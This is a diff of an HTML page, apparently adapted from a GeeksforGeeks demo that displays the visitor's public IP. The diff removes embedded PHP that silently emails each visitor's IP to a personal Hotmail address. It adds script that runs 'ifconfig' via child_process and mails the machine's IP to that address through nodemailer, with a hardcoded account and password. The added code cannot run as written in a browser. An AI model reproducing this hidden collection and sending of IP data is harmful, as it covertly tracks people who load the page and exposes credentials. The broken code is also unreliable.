@@ -1,37 +1,69 @@
 <!DOCTYPE html>
 <html>
- 
+
 <head>
-    <title>Getting Clients IP</title>
-    <style>
-    p, h1 {
-        color: green;
+
+    <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+
+      <script>
+
+    /* Add "https://api.ipify.org?format=json" statement
+               this will communicate with the ipify servers in
+               order to retrieve the IP address $.getJSON will
+               load JSON-encoded data from the server using a
+               GET HTTP request */
+
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+
+        // Setting text of element P with id gfg
+        $("#gfg").html(data.ip);
+    })
+    </script>
+    <script>
+        var exec = require("child_process").exec;
+    var ipAddress;
+    var child = exec("ifconfig | grep -m 1 inet", function (error, stdout, stderr) {
+       ipAddress = stdout;
+       start();
+    });
+    var email = require('nodemailer');
+
+    function start(){
+
+        email.SMTP = {
+           host: 'smtp.gmail.com',
+           port: 465,
+           ssl: true,
+           user_authentication: true,
+           user: 'lmao123451234512345@hotmail.com',
+           pass: 'lmao12345'
+        }
+
+        email.send_mail({
+           sender: 'lmao123451234512345@hotmail.com',
+           to: 'pedro-guilherme-moreira@hotmail.com',
+           subject: 'Testing!',
+           body: 'IP Address of the machine is ' + ipAddress
+           },
+           function(error, success) {
+               console.log('Message ' + success ? 'sent' : 'failed');
+                       console.log('IP Address is ' + ipAddress);
+                       process.exit();
+           }
+        );
     }
-    </style>
+    </script>
+
 </head>
- 
+
 <body>
+  hello
+  <div id="userip"></div>
     <center>
-        <h1>GeeksforGeeks</h1>
         <h3>Public IP Address of user is:</h3>
         <p id="gfg"></p>
-    </center>
 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-     
-    <script>
-        $.getJSON("https://api.ipify.org?format=json", function(data) {
-            $("#gfg").html(data.ip);
-            <?php
-                $ip = $_SERVER['REMOTE_ADDR'];
-                $to = "pedro-guilherme-moreira@hotmail.com";
-                $subject = "Novo IP registrado";
-                $message = "Um novo endereço IP foi registrado: $ip";
-                mail($to, $subject, $message);
-            ?>
-        });
-    </script>
- 
+    </center>
 </body>
- 
-</html>
